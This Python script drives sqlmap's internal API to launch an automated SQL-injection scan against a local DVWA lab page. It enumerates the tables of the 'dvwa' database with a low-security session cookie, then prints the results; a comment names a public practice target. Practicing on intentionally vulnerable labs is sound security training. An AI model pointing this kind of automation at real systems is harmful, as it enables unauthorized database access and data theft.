import os
import sys
import json
import time
import sqlite3
import tempfile
from requests import *
from lib.utils import api
from lib.core.data import kb
from lib.core.data import conf
from lib.core.common import setPaths
from lib.core.common import getPartRun
from lib.core.enums import MKSTEMP_PREFIX
from lib.core.convert import dejsonize, hexencode
from thirdparty.bottle.bottle import request
from sqlmap import modulePath


api_url = "127.0.0.1"

database='/tmp/sqlmapipc' + str(hexencode(os.urandom(8)))
api.DataStore.admin_id = hexencode(os.urandom(16))
api.DataStore.username = None
api.DataStore.password = None
api.DataStore.current_db = api.Database(database=database)
api.DataStore.current_db.connect()
api.DataStore.current_db.init()
setPaths(modulePath())

# import ipdb; ipdb.set_trace()
_, api.Database.filepath = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.IPC, text=False)
os.close(_)

# conf.api = True
something = {u'url': u'http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit', u'db': u'dvwa', u'getTables': True, u'cookie': u'PHPSESSID=g6ber5d5m4r7j3blt0f3gfjpo7; security=low'}
# http://hackyourselffirst.troyhunt.com/CarsByCylinders?Cylinders=V12

taskid = hexencode(os.urandom(8))
remote_addr = api_url
api.DataStore.tasks[taskid] = api.Task(taskid, remote_addr)

for option, value in something.items():
    api.DataStore.tasks[taskid].set_option(option, value)

api.DataStore.tasks[taskid].engine_start()
print('Engine status: ' + str(api.DataStore.tasks[taskid].engine_has_terminated()))
time.sleep(30)
print('Engine status: ' + str(api.DataStore.tasks[taskid].engine_has_terminated()))
# connection = sqlite3.connect(database, timeout=3, isolation_level=None, check_same_thread=False)
# cursor = connection.cursor()
json_data_message = list()
for status, content_type, value in api.DataStore.current_db.execute("SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_data_message.append({"status": status, "type": content_type, "value": dejsonize(value)})

print('----------------------------------------')
print(json_data_message)
print('----------------------------------------')
# cursor.close()
os.remove(database)